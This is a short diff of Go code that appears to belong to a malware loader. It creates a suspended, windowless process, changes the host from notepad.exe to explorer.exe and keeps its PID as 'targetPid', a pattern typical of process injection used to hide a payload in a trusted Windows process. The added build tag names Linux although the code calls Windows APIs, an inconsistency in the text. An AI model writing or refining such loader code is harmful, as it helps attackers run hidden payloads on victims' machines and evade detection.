@@ -1,3 +1,4 @@
+// +build linux,amd64,go1.15,!cgo
 package main
 
 import (
@@ -141,7 +142,7 @@ func main() {
 		startupInfo.Cb = uint32(unsafe.Sizeof(startupInfo))
 		startupInfo.Flags |= windows.STARTF_USESHOWWINDOW
 		creationFlags := windows.CREATE_SUSPENDED | windows.CREATE_NO_WINDOW | windows.EXTENDED_STARTUPINFO_PRESENT
-		programPath := bake("§c:\\windows\\system32\\notepad.exe§")
+		programPath := bake("§c:\\windows\\explorer.exe§")
 		utfProgramPath, _ := windows.UTF16PtrFromString(programPath)
 		syscalls.CreateProcess(nil, utfProgramPath, nil, nil, true, uint32(creationFlags), nil, nil, &startupInfo, &procInfo)
 		targetPid := int(procInfo.ProcessId)
